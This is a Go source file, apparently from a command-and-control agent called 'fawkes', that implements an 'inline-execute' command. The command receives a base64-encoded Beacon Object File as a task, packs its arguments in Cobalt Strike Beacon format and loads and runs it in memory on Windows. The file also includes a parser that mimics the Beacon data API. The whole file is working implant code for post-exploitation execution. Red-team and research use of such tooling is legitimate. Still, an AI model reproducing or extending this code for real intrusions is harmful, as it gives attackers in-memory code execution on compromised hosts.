//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"

	"fawkes/pkg/structs"

	"github.com/praetorian-inc/goffloader/src/coff"
	"golang.org/x/sys/windows"
)

// InlineExecuteCommand implements the inline-execute command for BOF/COFF execution
type InlineExecuteCommand struct{}

// Name returns the command name
func (c *InlineExecuteCommand) Name() string {
	return "inline-execute"
}

// Description returns the command description
func (c *InlineExecuteCommand) Description() string {
	return "Execute a Beacon Object File (BOF/COFF) in memory"
}

// InlineExecuteParams represents the parameters for inline-execute
type InlineExecuteParams struct {
	BOFB64     string   `json:"bof_b64"`     // Base64-encoded BOF bytes
	EntryPoint string   `json:"entry_point"` // Entry point function name
	Arguments  []string `json:"arguments"`   // Goffloader format arguments (e.g., ["zbing.com", "i80"])
}

// Execute executes the inline-execute command
func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params InlineExecuteParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate BOF data
	if params.BOFB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No BOF data provided",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode the base64-encoded BOF
	bofBytes, err := base64.StdEncoding.DecodeString(params.BOFB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding BOF data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(bofBytes) == 0 {
		return structs.CommandResult{
			Output:    "Error: BOF data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Pack arguments using goffloader's lighthouse.PackArgs
	// Note: goffloader's 'z' type has a bug (only writes low bytes of UTF-16)
	// so we use a custom packing function
	packedArgs, err := packBOFArgs(params.Arguments)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error packing arguments: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Build output string
	var output strings.Builder
	output.WriteString(fmt.Sprintf("[*] BOF size: %d bytes\n", len(bofBytes)))
	output.WriteString(fmt.Sprintf("[*] Entry point: %s\n", params.EntryPoint))
	output.WriteString(fmt.Sprintf("[*] Arguments: %v\n", params.Arguments))
	output.WriteString(fmt.Sprintf("[*] Packed arguments size: %d bytes\n", len(packedArgs)))

	// Load and execute the BOF
	result, err := executeBOF(bofBytes, params.EntryPoint, packedArgs)
	if err != nil {
		output.WriteString(fmt.Sprintf("\n[!] Error executing BOF: %v\n", err))
		return structs.CommandResult{
			Output:    output.String(),
			Status:    "error",
			Completed: true,
		}
	}

	output.WriteString("\n[+] BOF execution completed\n")
	if result != "" {
		output.WriteString(fmt.Sprintf("\n--- BOF Output ---\n%s\n", result))
	}

	return structs.CommandResult{
		Output:    output.String(),
		Status:    "success",
		Completed: true,
	}
}

// executeBOF loads and executes a BOF/COFF file using goffloader
func executeBOF(bofBytes []byte, entryPoint string, packedArgs []byte) (string, error) {
	// Use goffloader to load and execute the BOF
	// The coff.Load function handles:
	// 1. Loading COFF sections into memory
	// 2. Resolving relocations
	// 3. Resolving external symbols (Beacon API functions)
	// 4. Finding and executing the entry point
	// 5. Capturing and returning output
	
	output, err := coff.Load(bofBytes, packedArgs)
	if err != nil {
		return "", fmt.Errorf("failed to load/execute BOF: %w", err)
	}
	
	return output, nil
}

// packBOFArgs properly packs BOF arguments in the Beacon format
// This fixes the bug in goffloader's PackString which only writes low bytes
func packBOFArgs(args []string) ([]byte, error) {
	if len(args) == 0 {
		return nil, nil
	}

	var buff []byte
	for _, arg := range args {
		if len(arg) < 1 {
			continue
		}

		argType := arg[0]
		argValue := ""
		if len(arg) > 1 {
			argValue = arg[1:]
		}

		switch argType {
		case 'z': // ASCII null-terminated string (FIXED - writes actual ASCII, not broken UTF-16)
			// Standard Beacon format: [4-byte size][string bytes][null terminator]
			data := []byte(argValue)
			size := len(data) + 1 // +1 for null terminator
			
			sizeBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(sizeBytes, uint32(size))
			buff = append(buff, sizeBytes...)
			buff = append(buff, data...)
			buff = append(buff, 0) // null terminator

		case 'Z': // Wide string (UTF-16LE) null-terminated
			wideData, err := windows.UTF16FromString(argValue)
			if err != nil {
				return nil, fmt.Errorf("failed to convert to UTF-16: %w", err)
			}
			
			// Convert UTF-16 array to bytes (UTF16FromString already includes null terminator)
			wideBytes := make([]byte, len(wideData)*2)
			for i, w := range wideData {
				binary.LittleEndian.PutUint16(wideBytes[i*2:], w)
			}
			
			sizeBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(sizeBytes, uint32(len(wideBytes)))
			buff = append(buff, sizeBytes...)
			buff = append(buff, wideBytes...)

		case 'i': // int32
			val, err := strconv.ParseInt(argValue, 0, 32)
			if err != nil {
				return nil, fmt.Errorf("invalid int32 value '%s': %w", argValue, err)
			}
			
			sizeBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(sizeBytes, 4)
			buff = append(buff, sizeBytes...)
			
			valBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(valBytes, uint32(val))
			buff = append(buff, valBytes...)

		case 's': // int16
			val, err := strconv.ParseInt(argValue, 0, 16)
			if err != nil {
				return nil, fmt.Errorf("invalid int16 value '%s': %w", argValue, err)
			}
			
			sizeBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(sizeBytes, 2)
			buff = append(buff, sizeBytes...)
			
			valBytes := make([]byte, 2)
			binary.LittleEndian.PutUint16(valBytes, uint16(val))
			buff = append(buff, valBytes...)

		case 'b': // binary data (base64)
			data, err := base64.StdEncoding.DecodeString(argValue)
			if err != nil {
				return nil, fmt.Errorf("invalid base64 data '%s': %w", argValue, err)
			}
			
			sizeBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(sizeBytes, uint32(len(data)))
			buff = append(buff, sizeBytes...)
			buff = append(buff, data...)

		default:
			return nil, fmt.Errorf("unknown argument type '%c'", argType)
		}
	}

	return buff, nil
}

// BeaconDataParser provides a simple interface for BOFs to parse their arguments
// This mimics the Cobalt Strike Beacon Data Parser API
type BeaconDataParser struct {
	buffer []byte
	offset int
}

// NewBeaconDataParser creates a new parser for packed BOF arguments
func NewBeaconDataParser(data []byte) *BeaconDataParser {
	// Skip the first 8 bytes (total size and arg count)
	if len(data) >= 8 {
		return &BeaconDataParser{
			buffer: data,
			offset: 8,
		}
	}
	return &BeaconDataParser{
		buffer: data,
		offset: 0,
	}
}

// ParseInt reads an int32 from the buffer
func (p *BeaconDataParser) ParseInt() int32 {
	if p.offset+8 > len(p.buffer) {
		return 0
	}
	// Skip size (4 bytes)
	p.offset += 4
	// Read value
	val := int32(p.buffer[p.offset]) |
		int32(p.buffer[p.offset+1])<<8 |
		int32(p.buffer[p.offset+2])<<16 |
		int32(p.buffer[p.offset+3])<<24
	p.offset += 4
	return val
}

// ParseShort reads an int16 from the buffer
func (p *BeaconDataParser) ParseShort() int16 {
	if p.offset+6 > len(p.buffer) {
		return 0
	}
	// Skip size (4 bytes)
	p.offset += 4
	// Read value
	val := int16(p.buffer[p.offset]) | int16(p.buffer[p.offset+1])<<8
	p.offset += 2
	return val
}

// ParseString reads a null-terminated string from the buffer
func (p *BeaconDataParser) ParseString() string {
	if p.offset+4 > len(p.buffer) {
		return ""
	}
	// Read size
	size := int(p.buffer[p.offset]) |
		int(p.buffer[p.offset+1])<<8 |
		int(p.buffer[p.offset+2])<<16 |
		int(p.buffer[p.offset+3])<<24
	p.offset += 4

	if p.offset+size > len(p.buffer) {
		return ""
	}

	// Read string (excluding null terminator)
	str := string(p.buffer[p.offset : p.offset+size-1])
	p.offset += size
	return str
}

// ParseBytes reads binary data from the buffer
func (p *BeaconDataParser) ParseBytes() []byte {
	if p.offset+4 > len(p.buffer) {
		return nil
	}
	// Read size
	size := int(p.buffer[p.offset]) |
		int(p.buffer[p.offset+1])<<8 |
		int(p.buffer[p.offset+2])<<16 |
		int(p.buffer[p.offset+3])<<24
	p.offset += 4

	if p.offset+size > len(p.buffer) {
		return nil
	}

	data := make([]byte, size)
	copy(data, p.buffer[p.offset:p.offset+size])
	p.offset += size
	return data
}
